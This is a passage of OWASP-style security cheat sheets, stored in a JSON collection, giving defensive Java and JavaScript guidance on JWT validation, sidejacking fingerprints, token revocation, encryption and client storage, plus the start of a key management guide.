storage of the token (tackled in this cheatsheet) and others...\r\n\r\nIf your application does not need to be fully stateless, you can consider using traditional session system provided by all web frameworks and follow the advice from the dedicated [session management cheat sheet](Session_Management_Cheat_Sheet.md). However, for stateless applications, when well implemented, it's a good candidate.\r\n\r\n## Issues\r\n\r\n### None Hashing Algorithm\r\n\r\n#### Symptom\r\n\r\nThis attack, described [here](https://auth0.com/blog/critical-vulnerabilities-in-json-web-token-libraries/), occurs when an attacker alters the token and changes the hashing algorithm to indicate, through the *none* keyword, that the integrity of the token has already been verified. As explained in the link above *some libraries treated tokens signed with the none algorithm as a valid token with a verified signature*, so an attacker can alter the token claims and the modified token will still be trusted by the application.\r\n\r\n#### How to Prevent\r\n\r\nFirst, use a JWT library that is not exposed to this vulnerability.\r\n\r\nLast, during token validation, explicitly request that the expected algorithm was used.\r\n\r\n#### Implementation Example\r\n\r\n``` java\r\n// HMAC key - Block serialization and storage as String in JVM memory\r\nprivate transient byte[] keyHMAC = ...;\r\n\r\n...\r\n\r\n//Create a verification context for the token requesting\r\n//explicitly the use of the HMAC-256 hashing algorithm\r\nJWTVerifier verifier = JWT.require(Algorithm.HMAC256(keyHMAC)).build();\r\n\r\n//Verify the token, if the verification fail then a exception is thrown\r\nDecodedJWT decodedToken = verifier.verify(token);\r\n```\r\n\r\n### Token Sidejacking\r\n\r\n#### Symptom\r\n\r\nThis attack occurs when a token has been intercepted/stolen by an attacker and they use it to gain access to the system using targeted user identity.\r\n\r\n#### How to Prevent\r\n\r\nA way to prevent it is to add a \"user context\" in the token. A user context will be composed of the following information:\r\n\r\n- A random string that will be generated during the authentication phase. It will be sent to the client as an hardened cookie (flags: [HttpOnly + Secure](https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies#Secure_and_HttpOnly_cookies) + [SameSite](https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies#SameSite_cookies) + [Max-Age](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Set-Cookie) + [cookie prefixes](https://googlechrome.github.io/samples/cookie-prefixes/)). Avoid setting *expires* header so that the cookie is cleared when the browser is closed. Set *Max-Age* to a value smaller or equal to the value of JWT token expiry, but never more.\r\n- A SHA256 hash of the random string will be stored in the token (instead of the raw value) in order to prevent any XSS issues allowing the attacker to read the random string value and setting the expected cookie.\r\n\r\nIP addresses should not be used because there are some legitimate situations in which the IP address can change during the same session. For example, when an user accesses an application through their mobile device and the mobile operator changes during the exchange, then the IP address may (often) change. Moreover, using the IP address can potentially cause issues with [European GDPR](https://gdpr.eu/) compliance.\r\n\r\nDuring token validation, if the received token does not contain the right context (for example, if it has been replayed), then it must be rejected.\r\n\r\n#### Implementation example\r\n\r\nCode to create the token after successful authentication.\r\n\r\n``` java\r\n// HMAC key - Block serialization and storage as String in JVM memory\r\nprivate transient byte[] keyHMAC = ...;\r\n// Random data generator\r\nprivate SecureRandom secureRandom = new SecureRandom();\r\n\r\n...\r\n\r\n//Generate a random string that will constitute the fingerprint for this user\r\nbyte[] randomFgp = new byte[50];\r\nsecureRandom.nextBytes(randomFgp);\r\nString userFingerprint = DatatypeConverter.printHexBinary(randomFgp);\r\n\r\n//Add the fingerprint in a hardened cookie - Add cookie manually because\r\n//SameSite attribute is not supported by javax.servlet.http.Cookie class\r\nString fingerprintCookie = \"__Secure-Fgp=\" + userFingerprint\r\n                           + \"; SameSite=Strict; HttpOnly; Secure\";\r\nresponse.addHeader(\"Set-Cookie\", fingerprintCookie);\r\n\r\n//Compute a SHA256 hash of the fingerprint in order to store the\r\n//fingerprint hash (instead of the raw value) in the token\r\n//to prevent an XSS to be able to read the fingerprint and\r\n//set the expected cookie itself\r\nMessageDigest digest = MessageDigest.getInstance(\"SHA-256\");\r\nbyte[] userFingerprintDigest = digest.digest(userFingerprint.getBytes(\"utf-8\"));\r\nString userFingerprintHash = DatatypeConverter.printHexBinary(userFingerprintDigest);\r\n\r\n//Create the token with a validity of 15 minutes and client context (fingerprint) information\r\nCalendar c = Calendar.getInstance();\r\nDate now = c.getTime();\r\nc.add(Calendar.MINUTE, 15);\r\nDate expirationDate = c.getTime();\r\nMap<String, Object> headerClaims = new HashMap<>();\r\nheaderClaims.put(\"typ\", \"JWT\");\r\nString token = JWT.create().withSubject(login)\r\n   .withExpiresAt(expirationDate)\r\n   .withIssuer(this.issuerID)\r\n   .withIssuedAt(now)\r\n   .withNotBefore(now)\r\n   .withClaim(\"userFingerprint\", userFingerprintHash)\r\n   .withHeader(headerClaims)\r\n   .sign(Algorithm.HMAC256(this.keyHMAC));\r\n```\r\n\r\nCode to validate the token.\r\n\r\n``` java\r\n// HMAC key - Block serialization and storage as String in JVM memory\r\nprivate transient byte[] keyHMAC = ...;\r\n\r\n...\r\n\r\n//Retrieve the user fingerprint from the dedicated cookie\r\nString userFingerprint = null;\r\nif (request.getCookies() != null && request.getCookies().length > 0) {\r\n List<Cookie> cookies = Arrays.stream(request.getCookies()).collect(Collectors.toList());\r\n Optional<Cookie> cookie = cookies.stream().filter(c -> \"__Secure-Fgp\"\r\n                                            .equals(c.getName())).findFirst();\r\n if (cookie.isPresent()) {\r\n   userFingerprint = cookie.get().getValue();\r\n }\r\n}\r\n\r\n//Compute a SHA256 hash of the received fingerprint in cookie in order to compare\r\n//it to the fingerprint hash stored in the token\r\nMessageDigest digest = MessageDigest.getInstance(\"SHA-256\");\r\nbyte[] userFingerprintDigest = digest.digest(userFingerprint.getBytes(\"utf-8\"));\r\nString userFingerprintHash = DatatypeConverter.printHexBinary(userFingerprintDigest);\r\n\r\n//Create a verification context for the token\r\nJWTVerifier verifier = JWT.require(Algorithm.HMAC256(keyHMAC))\r\n                              .withIssuer(issuerID)\r\n                              .withClaim(\"userFingerprint\", userFingerprintHash)\r\n                              .build();\r\n\r\n//Verify the token, if the verification fail then an exception is thrown\r\nDecodedJWT decodedToken = verifier.verify(token);\r\n```\r\n\r\n### No Built-In Token Revocation by the User\r\n\r\n#### Symptom\r\n\r\nThis problem is inherent to JWT because a token only becomes invalid when it expires. The user has no built-in feature to explicitly revoke the validity of a token. This means that if it is stolen, a user cannot revoke the token itself thereby blocking the attacker.\r\n\r\n#### How to Prevent\r\n\r\nSince JWT tokens are stateless, There is no session maintained on the server(s) serving client requests. As such, there is no session to invalidate on the server side. A well implemented Token Sidejacking solution (as explained above) should alleviate the need for maintaining block list on server side. This is because a hardened cookie used in the Token Sidejacking can be considered as secure as a session ID used in the traditional session system, and unless both the cookie and the JWT token are intercepted/stolen, the JWT is unusable. A logout can thus be 'simulated' by clearing the JWT from session storage. If the user chooses to close the browser instead, then both the cookie and sessionStorage are cleared automatically.\r\n\r\nAnother way to protect against this is to implement a token block list that will be used to mimic the \"logout\" feature that exists with traditional session management system.\r\n\r\nThe block list will keep a digest (SHA-256 encoded in HEX) of the token with a revocation date. This entry must endure at least until the expiration of the token.\r\n\r\nWhen the user wants to \"logout\" then it call a dedicated service that will add the provided user token to the block list resulting in an immediate invalidation of the token for further usage in the application.\r\n\r\n#### Implementation Example\r\n\r\n##### Block List Storage\r\n\r\nA database table with the following structure will be used as the central block list storage.\r\n\r\n``` sql\r\ncreate table if not exists revoked_token(jwt_token_digest varchar(255) primary key,\r\nrevocation_date timestamp default now());\r\n```\r\n\r\n##### Token Revocation Management\r\n\r\nCode in charge of adding a token to the block list and checking if a token is revoked.\r\n\r\n``` java\r\n/**\r\n* Handle the revocation of the token (logout).\r\n* Use a DB in order to allow multiple instances to check for revoked token\r\n* and allow cleanup at centralized DB level.\r\n*/\r\npublic class TokenRevoker {\r\n\r\n /** DB Connection */\r\n @Resource(\"jdbc/storeDS\")\r\n private DataSource storeDS;\r\n\r\n /**\r\n  * Verify if a digest encoded in HEX of the ciphered token is present\r\n  * in the revocation table\r\n  *\r\n  * @param jwtInHex Token encoded in HEX\r\n  * @return Presence flag\r\n  * @throws Exception If any issue occur during communication with DB\r\n  */\r\n public boolean isTokenRevoked(String jwtInHex) throws Exception {\r\n     boolean tokenIsPresent = false;\r\n     if (jwtInHex != null && !jwtInHex.trim().isEmpty()) {\r\n         //Decode the ciphered token\r\n         byte[] cipheredToken = DatatypeConverter.parseHexBinary(jwtInHex);\r\n\r\n         //Compute a SHA256 of the ciphered token\r\n         MessageDigest digest = MessageDigest.getInstance(\"SHA-256\");\r\n         byte[] cipheredTokenDigest = digest.digest(cipheredToken);\r\n         String jwtTokenDigestInHex = DatatypeConverter.printHexBinary(cipheredTokenDigest);\r\n\r\n         //Search token digest in HEX in DB\r\n         try (Connection con = this.storeDS.getConnection()) {\r\n             String query = \"select jwt_token_digest from revoked_token where jwt_token_digest = ?\";\r\n             try (PreparedStatement pStatement = con.prepareStatement(query)) {\r\n                 pStatement.setString(1, jwtTokenDigestInHex);\r\n                 try (ResultSet rSet = pStatement.executeQuery()) {\r\n                     tokenIsPresent = rSet.next();\r\n                 }\r\n             }\r\n         }\r\n     }\r\n\r\n     return tokenIsPresent;\r\n }\r\n\r\n\r\n /**\r\n  * Add a digest encoded in HEX of the ciphered token to the revocation token table\r\n  *\r\n  * @param jwtInHex Token encoded in HEX\r\n  * @throws Exception If any issue occur during communication with DB\r\n  */\r\n public void revokeToken(String jwtInHex) throws Exception {\r\n     if (jwtInHex != null && !jwtInHex.trim().isEmpty()) {\r\n         //Decode the ciphered token\r\n         byte[] cipheredToken = DatatypeConverter.parseHexBinary(jwtInHex);\r\n\r\n         //Compute a SHA256 of the ciphered token\r\n         MessageDigest digest = MessageDigest.getInstance(\"SHA-256\");\r\n         byte[] cipheredTokenDigest = digest.digest(cipheredToken);\r\n         String jwtTokenDigestInHex = DatatypeConverter.printHexBinary(cipheredTokenDigest);\r\n\r\n         //Check if the token digest in HEX is already in the DB and add it if it is absent\r\n         if (!this.isTokenRevoked(jwtInHex)) {\r\n             try (Connection con = this.storeDS.getConnection()) {\r\n                 String query = \"insert into revoked_token(jwt_token_digest) values(?)\";\r\n                 int insertedRecordCount;\r\n                 try (PreparedStatement pStatement = con.prepareStatement(query)) {\r\n                     pStatement.setString(1, jwtTokenDigestInHex);\r\n                     insertedRecordCount = pStatement.executeUpdate();\r\n                 }\r\n                 if (insertedRecordCount != 1) {\r\n                     throw new IllegalStateException(\"Number of inserted record is invalid,\" +\r\n                     \" 1 expected but is \" + insertedRecordCount);\r\n                 }\r\n             }\r\n         }\r\n\r\n     }\r\n }\r\n```\r\n\r\n### Token Information Disclosure\r\n\r\n#### Symptom\r\n\r\nThis attack occurs when an attacker has access to a token (or a set of tokens) and extracts information stored in it (the contents of JWT tokens are base64 encoded, but is not encrypted by default) in order to obtain information about the system. Information can be for example the security roles, login format...\r\n\r\n#### How to Prevent\r\n\r\nA way to protect against this attack is to cipher the token using, for example, a symmetric algorithm.\r\n\r\nIt's also important to protect the ciphered data against attack like [Padding Oracle](https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/09-Testing_for_Weak_Cryptography/02-Testing_for_Padding_Oracle.html) or any other attack using cryptanalysis.\r\n\r\nIn order to achieve all these goals, the *AES-[GCM](https://en.wikipedia.org/wiki/Galois/Counter_Mode)* algorithm is used which provides *Authenticated Encryption with Associated Data*.\r\n\r\nMore details from [here](https://github.com/google/tink/blob/master/docs/PRIMITIVES.md#deterministic-authenticated-encryption-with-associated-data):\r\n\r\n```text\r\nAEAD primitive (Authenticated Encryption with Associated Data) provides functionality of symmetric\r\nauthenticated encryption.\r\n\r\nImplementations of this primitive are secure against adaptive chosen ciphertext attacks.\r\n\r\nWhen encrypting a plaintext one can optionally provide associated data that should be authenticated\r\nbut not encrypted.\r\n\r\nThat is, the encryption with associated data ensures authenticity (ie. who the sender is) and\r\nintegrity (ie. data has not been tampered with) of that data, but not its secrecy.\r\n\r\nSee RFC5116: https://tools.ietf.org/html/rfc5116\r\n```\r\n\r\n**Note:**\r\n\r\nHere ciphering is added mainly to hide internal information but it's very important to remember that the first protection against tampering of the JWT token is the signature. So, the token signature and its verification must be always in place.\r\n\r\n#### Implementation Example\r\n\r\n##### Token Ciphering\r\n\r\nCode in charge of managing the ciphering. [Google Tink](https://github.com/google/tink) dedicated crypto library is used to handle ciphering operations in order to use built-in best practices provided by this library.\r\n\r\n``` java\r\n/**\r\n * Handle ciphering and deciphering of the token using AES-GCM.\r\n *\r\n * @see \"https://github.com/google/tink/blob/master/docs/JAVA-HOWTO.md\"\r\n */\r\npublic class TokenCipher {\r\n\r\n    /**\r\n     * Constructor - Register AEAD configuration\r\n     *\r\n     * @throws Exception If any issue occur during AEAD configuration registration\r\n     */\r\n    public TokenCipher() throws Exception {\r\n        AeadConfig.register();\r\n    }\r\n\r\n    /**\r\n     * Cipher a JWT\r\n     *\r\n     * @param jwt          Token to cipher\r\n     * @param keysetHandle Pointer to the keyset handle\r\n     * @return The ciphered version of the token encoded in HEX\r\n     * @throws Exception If any issue occur during token ciphering operation\r\n     */\r\n    public String cipherToken(String jwt, KeysetHandle keysetHandle) throws Exception {\r\n        //Verify parameters\r\n        if (jwt == null || jwt.isEmpty() || keysetHandle == null) {\r\n            throw new IllegalArgumentException(\"Both parameters must be specified!\");\r\n        }\r\n\r\n        //Get the primitive\r\n        Aead aead = AeadFactory.getPrimitive(keysetHandle);\r\n\r\n        //Cipher the token\r\n        byte[] cipheredToken = aead.encrypt(jwt.getBytes(), null);\r\n\r\n        return DatatypeConverter.printHexBinary(cipheredToken);\r\n    }\r\n\r\n    /**\r\n     * Decipher a JWT\r\n     *\r\n     * @param jwtInHex     Token to decipher encoded in HEX\r\n     * @param keysetHandle Pointer to the keyset handle\r\n     * @return The token in clear text\r\n     * @throws Exception If any issue occur during token deciphering operation\r\n     */\r\n    public String decipherToken(String jwtInHex, KeysetHandle keysetHandle) throws Exception {\r\n        //Verify parameters\r\n        if (jwtInHex == null || jwtInHex.isEmpty() || keysetHandle == null) {\r\n            throw new IllegalArgumentException(\"Both parameters must be specified !\");\r\n        }\r\n\r\n        //Decode the ciphered token\r\n        byte[] cipheredToken = DatatypeConverter.parseHexBinary(jwtInHex);\r\n\r\n        //Get the primitive\r\n        Aead aead = AeadFactory.getPrimitive(keysetHandle);\r\n\r\n        //Decipher the token\r\n        byte[] decipheredToken = aead.decrypt(cipheredToken, null);\r\n\r\n        return new String(decipheredToken);\r\n    }\r\n}\r\n```\r\n\r\n##### Creation / Validation of the Token\r\n\r\nUse the token ciphering handler during the creation and the validation of the token.\r\n\r\nLoad keys (ciphering key was generated and stored using [Google Tink](https://github.com/google/tink/blob/master/docs/JAVA-HOWTO.md#generating-new-keysets)) and setup cipher.\r\n\r\n``` java\r\n//Load keys from configuration text/json files in order to avoid to storing keys as a String in JVM memory\r\nprivate transient byte[] keyHMAC = Files.readAllBytes(Paths.get(\"src\", \"main\", \"conf\", \"key-hmac.txt\"));\r\nprivate transient KeysetHandle keyCiphering = CleartextKeysetHandle.read(JsonKeysetReader.withFile(\r\nPaths.get(\"src\", \"main\", \"conf\", \"key-ciphering.json\").toFile()));\r\n\r\n...\r\n\r\n//Init token ciphering handler\r\nTokenCipher tokenCipher = new TokenCipher();\r\n```\r\n\r\nToken creation.\r\n\r\n``` java\r\n//Generate the JWT token using the JWT API...\r\n//Cipher the token (String JSON representation)\r\nString cipheredToken = tokenCipher.cipherToken(token, this.keyCiphering);\r\n//Send the ciphered token encoded in HEX to the client in HTTP response...\r\n```\r\n\r\nToken validation.\r\n\r\n``` java\r\n//Retrieve the ciphered token encoded in HEX from the HTTP request...\r\n//Decipher the token\r\nString token = tokenCipher.decipherToken(cipheredToken, this.keyCiphering);\r\n//Verify the token using the JWT API...\r\n//Verify access...\r\n```\r\n\r\n### Token Storage on Client Side\r\n\r\n#### Symptom\r\n\r\nThis occurs when an application stores the token in a manner exhibiting the following behavior:\r\n\r\n- Automatically sent by the browser (*Cookie* storage).\r\n- Retrieved even if the browser is restarted (Use of browser *localStorage* container).\r\n- Retrieved in case of [XSS](Cross_Site_Scripting_Prevention_Cheat_Sheet.md) issue (Cookie accessible to JavaScript code or Token stored in browser local/session storage).\r\n\r\n#### How to Prevent\r\n\r\n1. Store the token using the browser *sessionStorage* container, or use JavaScript *closures* with *private* variables\r\n1. Add it as a *Bearer* HTTP `Authentication` header with JavaScript when calling services.\r\n1. Add [fingerprint](JSON_Web_Token_for_Java_Cheat_Sheet.md#token-sidejacking) information to the token.\r\n\r\nBy storing the token in browser *sessionStorage* container it exposes the token to being stolen through a XSS attack. However, fingerprints added to the token prevent reuse of the stolen token by the attacker on their machine. To close a maximum of exploitation surfaces for an attacker, add a browser [Content Security Policy](https://cheatsheetseries.owasp.org/cheatsheets/Content_Security_Policy_Cheat_Sheet.html) to harden the execution context.\r\n\r\nAn alternative to storing token in browser *sessionStorage* is to use JavaScript private variable or Closures. In this, access to all web requests are routed through a JavaScript module that encapsulates the token in a private variable which can not be accessed other than from within the module.\r\n\r\n*Note:*\r\n\r\n- The remaining case is when an attacker uses the user's browsing context as a proxy to use the target application through the legitimate user but the Content Security Policy can prevent communication with non expected domains.\r\n- It's also possible to implement the authentication service in a way that the token is issued within a hardened cookie, but in this case, protection against a [Cross-Site Request Forgery](Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.md) attack must be implemented.\r\n\r\n#### Implementation Example\r\n\r\nJavaScript code to store the token after authentication.\r\n\r\n``` javascript\r\n/* Handle request for JWT token and local storage*/\r\nfunction authenticate() {\r\n    const login = $(\"#login\").val();\r\n    const postData = \"login=\" + encodeURIComponent(login) + \"&password=test\";\r\n\r\n    $.post(\"/services/authenticate\", postData, function (data) {\r\n        if (data.status == \"Authentication successful!\") {\r\n            ...\r\n            sessionStorage.setItem(\"token\", data.token);\r\n        }\r\n        else {\r\n            ...\r\n            sessionStorage.removeItem(\"token\");\r\n        }\r\n    })\r\n    .fail(function (jqXHR, textStatus, error) {\r\n        ...\r\n        sessionStorage.removeItem(\"token\");\r\n    });\r\n}\r\n```\r\n\r\nJavaScript code to add the token as a *Bearer* HTTP Authentication header when calling a service, for example a service to validate token here.\r\n\r\n``` javascript\r\n/* Handle request for JWT token validation */\r\nfunction validateToken() {\r\n    var token = sessionStorage.getItem(\"token\");\r\n\r\n    if (token == undefined || token == \"\") {\r\n        $(\"#infoZone\").removeClass();\r\n        $(\"#infoZone\").addClass(\"alert alert-warning\");\r\n        $(\"#infoZone\").text(\"Obtain a JWT token first :)\");\r\n        return;\r\n    }\r\n\r\n    $.ajax({\r\n        url: \"/services/validate\",\r\n        type: \"POST\",\r\n        beforeSend: function (xhr) {\r\n            xhr.setRequestHeader(\"Authorization\", \"bearer \" + token);\r\n        },\r\n        success: function (data) {\r\n            ...\r\n        },\r\n        error: function (jqXHR, textStatus, error) {\r\n            ...\r\n        },\r\n    });\r\n}\r\n```\r\n\r\nJavaScript code to implement closures with private variables:\r\n\r\n``` javascript\r\nfunction myFetchModule() {\r\n    // Protect the original 'fetch' from getting overwritten via XSS\r\n    const fetch = window.fetch;\r\n\r\n    const authOrigins = [\"https://yourorigin\", \"http://localhost\"];\r\n    let token = '';\r\n\r\n    this.setToken = (value) => {\r\n        token = value\r\n    }\r\n\r\n    this.fetch = (resource, options) => {\r\n        let req = new Request(resource, options);\r\n        destOrigin = new URL(req.url).origin;\r\n        if (token && authOrigins.includes(destOrigin)) {\r\n            req.headers.set('Authorization', token);\r\n        }\r\n        return fetch(req)\r\n    }\r\n}\r\n    \r\n...\r\n \r\n// usage:\r\nconst myFetch = new myFetchModule()\r\n\r\nfunction login() {\r\n  fetch(\"/api/login\")\r\n      .then((res) => {\r\n          if (res.status == 200) {\r\n              return res.json()\r\n          } else {\r\n              throw Error(res.statusText)\r\n          }\r\n      })\r\n      .then(data => {\r\n          myFetch.setToken(data.token)\r\n          console.log(\"Token received and stored.\")\r\n      })\r\n      .catch(console.error)\r\n}\r\n\r\n...\r\n\r\n// after login, subsequent api calls:\r\nfunction makeRequest() {\r\n    myFetch.fetch(\"/api/hello\", {headers: {\"MyHeader\": \"foobar\"}})\r\n        .then((res) => {\r\n            if (res.status == 200) {\r\n                return res.text()\r\n            } else {\r\n                throw Error(res.statusText)\r\n            }\r\n        }).then(responseText => console.log(\"helloResponse\", responseText))\r\n        .catch(console.error)\r\n}\r\n```\r\n\r\n### Weak Token Secret\r\n\r\n#### Symptom\r\n\r\nWhen the token is protected using an HMAC based algorithm, the security of the token is entirely dependent on the strength of the secret used with the HMAC. If an attacker can obtain a valid JWT, they can then carry out an offline attack and attempt to crack the secret using tools such as [John the Ripper](https://github.com/magnumripper/JohnTheRipper) or [Hashcat](https://github.com/hashcat/hashcat).\r\n\r\nIf they are successful, they would then be able to modify the token and re-sign it with the key they had obtained. This could let them escalate their privileges, compromise other users' accounts, or perform other actions depending on the contents of the JWT.\r\n\r\nThere are a number of [guides](https://www.notsosecure.com/crafting-way-json-web-tokens/) that document this process in greater detail.\r\n\r\n#### How to Prevent\r\n\r\nThe simplest way to prevent this attack is to ensure that the secret used to sign the JWTs is strong and unique, in order to make it harder for an attacker to crack. As this secret would never need to be typed by a human, it should be at least 64 characters, and generated using a [secure source of randomness](Cryptographic_Storage_Cheat_Sheet.md#secure-random-number-generation).\r\n\r\nAlternatively, consider the use of tokens that are signed with RSA rather than using an HMAC and secret key.\r\n\r\n#### Further Reading\r\n\r\n- [{JWT}.{Attack}.Playbook](https://github.com/ticarpi/jwt_tool/wiki) - A project documents the known attacks and potential security vulnerabilities and misconfigurations of JSON Web Tokens.\r\n- [JWT Best Practices Internet Draft](https://datatracker.ietf.org/doc/draft-ietf-oauth-jwt-bcp/)\r\n"
    },
    {
      "Key_Management_Cheat_Sheet.md": "# Key Management Cheat Sheet\r\n\r\n## Introduction\r\n\r\nThis Key Management Cheat Sheet provides developers with guidance for implementation of cryptographic key management within an application in a secure manner. It is important to document and harmonize rules and practices for:\r\n\r\n1. Key life cycle management (generation, distribution, destruction)\r\n2. Key compromise, recovery and zeroization\r\n3. Key storage\r\n4. Key agreement\r\n\r\n## General Guidelines and Considerations\r\n\r\nFormulate a plan for the overall organization's cryptographic strategy to guide developers working on different applications and ensure that each application's cryptographic capability meets minimum requirements and best practices.\r\n\r\nIdentify the cryptographic and key management requirements for your application and map all components that process or store cryptographic key material.\r\n\r\n## Key Selection\r\n\r\nSelection of the cryptographic and key management algorithms to use within a given application should begin with an understanding of the objectives of the application.\r\n\r\nFor example, if the application is required to store data securely, then the developer should select an algorithm suite that supports the objective of data at rest protection security. Applications that are required to transmit and receive data would select an algorithm suite that supports the objective of data in transit protection.\r\n\r\nWe have provided recommendations on the selection of crypto suites within an application based on application and security objectives. Application developers oftentimes begin the development of crypto and key management capabilities by examining what is available in a library.\r\n\r\nHowever, an analysis of the real needs of the application should be conducted to determine the optimal key management approach. Begin by understanding the security objectives of the application which will then drive the selection of cryptographic protocols that are best suited. For example, the application may require:\r\n\r\n1. Confidentiality of data at rest and confidentiality of data in transit.\r\n2. Authenticity of the end device.\r\n3. Authenticity of data origin.\r\n4. Integrity of data in transit.\r\n5. Keys to create the data encryption keys.\r\n\r\nOnce the understanding of the security needs of the application is achieved, developers can determine what protocols and algorithms are required. Once the protocols and algorithms are understood, you can begin to define the different types of keys that will support the application's objectives.\r\n\r\nThere are a diverse set of key types and certificates to consider, for example:\r\n\r\n1. **Encryption:** [Symmetric](https://en.wikipedia.org/wiki/Symmetric-key_algorithm) encryption keys, [Asymmetric](https://en.wikipedia.org/wiki/Public-key_cryptography) encryption keys (public and private).\r\n2. **Authentication of End Devices:** Pre-shared symmetric keys, Trusted certificates, Trust Anchors.\r\n3. **Data Origin Authentication:** [HMAC](https://en.wikipedia.org/wiki/HMAC).\r\n4. **Integrity Protection:** [Message Authentication Codes](https://en.wikipedia.org/wiki/Message_authentication_code) (MACs).\r\n5. **Key Encryption Keys**.\r\n\r\n### Algorithms and Protocols\r\n\r\nAccording to `NIST SP 800-57 Part 1`, many algorithms and schemes that provide a security service use a [hash function](https://en.wikipedia.org/wiki/Hash_function) as a component of the algorithm.\r\n\r\nHash functions can be found in digital signature algorithms (`FIPS186`), Keyed-Hash Message Authentication Codes (HMAC) (`FIPS198`), key-derivation functions/methods (`NIST Special Publications (SP) 800-56A, 800-56B, 800-56C and 800-108`), and random number generators (`NIST SP 800-90A`). Approved hash functions are defined in `FIPS180`.\r\n\r\n`NIST SP 800-57 Part 1` recognizes three basic classes of approved cryptographic algorithms: hash functions, symmetric- key algorithms and asymmetric-key algorithms. The classes are defined by the number of cryptographic keys that are used in conjunction with the algorithm.\r\n\r\nThe NSA released a report, [Commercial National Security Algorithm Suite 2.0](https://media.defense.gov/2022/Sep/07/2003071834/-1/-1/0/CSA_CNSA_2.0_ALGORITHMS_.PDF) which lists the cryptographic algorithms that are expected to be remain strong even with advances in quantum computing.\r\n\r\n#### Cryptographic hash functions\r\n\r\nCryptographic hash functions do not require keys. Hash functions generate a relatively small digest (hash value) from a (possibly) large input in a way that is fundamentally difficult to reverse (i.e., it is hard to find an input that will produce a given output). Hash functions are used as building blocks for key management, for example,\r\n\r\n1. To provide data authentication and integrity services (Section 4.2.3) – the hash function is used with a key to generate a message authentication code.\r\n2. To compress messages for digital signature generation and verification (Section 4.2.4).\r\n3. To derive keys in key-establishment algorithms (Section 4.2.5).\r\n4. To generate deterministic random numbers (Section 4.2.7).\r\n\r\n#### Symmetric-key algorithms\r\n\r\nSymmetric-key algorithms (sometimes known as secret-key algorithms) transform data in a way that is fundamentally difficult to undo without knowledge of a secret key. The key is \"symmetric\" because the same key is used for a cryptographic operation and its inverse (e.g., encryption and decryption).\r\n\r\nSymmetric keys are often known by more than one entity; however, the key shall not be disclosed to entities that are not authorized access to the data protected by that algorithm and key. Symmetric key algorithms are used, for example,\r\n\r\n1. To provide data confidentiality (Section 4.2.2); the same key is used to encrypt and decrypt data.\r\n2. To provide authentication and integrity services (Section 4.2.3) in the form of Message Authentication Codes (MACs); the same key is used to generate the MAC and to validate it. MACs normally employ either a symmetric key-encryption algorithm or a cryptographic hash function as their cryptographic primitive.\r\n3. As part of the key-establishment process (Section 4.2.5).\r\n4. To generate deterministic random numbers (Section 4.2.7).\r\n\r\n#### Asymmetric-key algorithms\r\n\r\nAsymmetric-key algorithms, commonly known as public-key algorithms, use two related keys (i.e., a key pair) to perform their functions: a public key and a private key. The public key may be known by anyone; the private key should be under the sole control of the entity that \"owns\" the key pair. Even though the public and private keys of a key pair are related, knowledge of the public key does not reveal the private key. Asymmetric algorithms are used, for example,\r\n\r\n1. To compute digital signatures (Section 4.2.4).\r\n2. To establish cryptographic keying material (Section 4.2.5).\r\n3. To generate random numbers (Section 4.2.7).\r\n\r\n#### Message Authentication Codes (MACs)\r\n\r\nMessage Authentication Codes (MACs) provide data authentication and integrity. A MAC is a cryptographic checksum on the data that is used in order to provide assurance that the data has not changed and that the MAC was computed by the expected entity.\r\n\r\nAlthough message integrity is often provided using non-cryptographic techniques known as error detection codes, these codes can be altered by an adversary to effect an action to the adversary's benefit. The use of an approved cryptographic mechanism, such as a MAC, can alleviate this problem.\r\n\r\nIn addition, the MAC can provide a recipient with assurance that the originator of the data is a key holder (i.e., an entity authorized to have the key). MACs are often used to authenticate the originator to the recipient when only those two parties share the MAC key.\r\n\r\n#### Digital Signatures\r\n\r\n[Digital signatures](https://en.wikipedia.org/wiki/Digital_signature) are used to provide authentication, integrity and [non-repudiation](https://en.wikipedia.org/wiki/Non-repudiation). Digital signatures are used in conjunction with hash functions and are computed on data of any length (up to a limit that is determined by the hash function).\r\n\r\n`FIPS186` specifies algorithms that are approved for the computation of digital signatures.\r\n\r\n#### Key Encryption Keys\r\n\r\nSymmetric key-wrapping keys are used to encrypt other keys using symmetric-key algorithms. Key-wrapping keys are also known as key encrypting keys.\r\n\r\n### Key Strength\r\n\r\nReview `NIST SP 800-57` (Recommendation for Key Management) for recommended guidelines on key strength for specific algorithm implementations. Also, consider these best practices:\r\n\r\n1. Establish what the application's minimum computational resistance to attack should be. Understanding the minimum computational resistance to attack should take into consideration the sophistication of your adversaries, how long data needs to be protected, where data is stored and if it is exposed. Identifying the computational resistance to attack will inform engineers as to the minimum length of the cryptographic key required to protect data over the life of that data. Consult `NIST SP 800-131a` for additional guidance on determining the appropriate key lengths for the algorithm of choice.\r\n2. When encrypting keys for storage or distribution, always encrypt a cryptographic key with another key of equal or greater cryptographic strength.\r\n3. When moving to [Elliptic Curve-based algorithms](https://en.wikipedia.org/wiki/Elliptic-curve_cryptography), choose a key length that meets or exceeds the comparative strength of other algorithms in use within your system. Refer to `NIST SP 800-57 Table 2`.\r\n4. Formulate a strategy for the overall organization's cryptographic strategy to guide developers working on different applications and ensure that each application's cryptographic capability meets minimum requirements and best practices.\r\n\r\n### Memory Management Considerations\r\n\r\nKeys stored in memory for a long time can become \"burned in\". This can be mitigated by splitting the key into components that are frequently updated. `NIST SP 800-57`).\r\n\r\nLoss or corruption of the memory media on which keys and/or certificates are stored, and recovery planning, according to `NIST SP 800-57`.\r\n\r\nPlan for the recovery from possible corruption of the memory media necessary for key or certificate generation, registration, and/or distribution systems, subsystems, or components as recommended in `NIST SP 800-57`.\r\n\r\n### Perfect Forward Secrecy\r\n\r\n[Ephemeral keys](https://en.wikipedia.org/wiki/Ephemeral_key) can provide perfect forward secrecy protection, which means a compromise of the server's long term signing key does not compromise the confidentiality of past sessions. Refer to [TLS cheat sheet](Transport_Layer_Protection_Cheat_Sheet.md).\r\n\r\n### Key Usage\r\n\r\nAccording to NIST, in general, a single key should be used for only one purpose (e.g., encryption, authentication, key wrapping, random number generation, or digital signatures).\r\n\r\nThere are several reasons for this:\r\n\r\n1. The use of the same key for two different cryptographic processes may weaken the security provided by one or both of the processes.\r\n2. Limiting the use of a key limits the damage that could be done if the key is compromised.\r\n3. Some uses of keys interfere with each other. For example, the length of time the key may be 